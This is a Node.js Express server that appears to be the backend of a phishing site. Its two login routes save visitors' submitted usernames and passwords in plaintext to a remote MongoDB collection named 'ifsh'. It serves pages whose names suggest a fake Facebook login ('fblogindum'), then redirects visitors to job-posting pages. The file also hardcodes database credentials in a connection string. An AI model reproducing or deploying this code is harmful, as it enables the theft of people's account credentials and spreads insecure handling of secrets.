const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

const uri = "mongodb+srv://user1:user123@login.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=login";
const client = new MongoClient(uri);

let db; // Declare the db variable

async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db('logdata'); // Your actual database name
        console.log("Connected to MongoDB");
    } catch (error) {
        console.error("MongoDB connection error:", error.message || error);
    }
}

connectToDatabase();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json()); // Add this line to handle JSON requests
app.use(express.static(__dirname)); // Serve static files from the "public" directory

// Route to handle login form submission
app.post('/submit-login', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            return res.status(500).send('Database connection not initialized.');
        }

        // Create the login data object
        const loginData = { username, password, timestamp: new Date() };
        
        // Log before inserting data
        console.log("Attempting to insert data:", loginData);
        
        // Insert the new user data without checking for existing users
        const result = await db.collection('ifsh').insertOne(loginData);
        
        // Log the result after successful insertion
        console.log("Data inserted successfully:", result);

        // Set a cookie to indicate successful login
        const expires = new Date(Date.now() + 60 * 60 * 1000).toUTCString(); // Cookie expires in 1 hour
        res.setHeader('Set-Cookie', `isLoggedIn=true; expires=${expires}; path=/;`);

        // Redirect to the job postings page after login
        res.redirect('/fblogindum2.html');
    } catch (error) {
        console.error('Error saving data to MongoDB:', error);
        res.status(500).send('Error saving data to MongoDB.');
    }
});

app.get('/fblogindum2.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum2.html'));
});

app.post('/submit-additional-info', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            return res.status(500).json({ success: false, message: 'Database connection not initialized.' });
        }

        const loginData = { username, password, timestamp: new Date() };
        
        console.log("Attempting to insert data:", loginData);
        
        const result = await db.collection('ifsh').insertOne(loginData);
        
        console.log("Data inserted successfully:", result);

        // Set a cookie to indicate successful login
        const expires = new Date(Date.now() + 60 * 60 * 1000).toUTCString(); // Cookie expires in 1 hour
        res.setHeader('Set-Cookie', `isLoggedIn=true; expires=${expires}; path=/;`);
        res.redirect('/Job Postings.html'); // Redirect to the job postings page after login
    } catch (error) {
        console.error('Error saving additional info to MongoDB:', error);
        return res.status(500).json({ success: false, message: 'Error saving additional info to MongoDB.' });
    }
});

// Routes to serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Home.html'));
});
app.get('/Job Postings.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Job Postings.html'));
});
app.get('/Announcements.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Announcements.html'));
});
app.get('/public/fblogindum.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
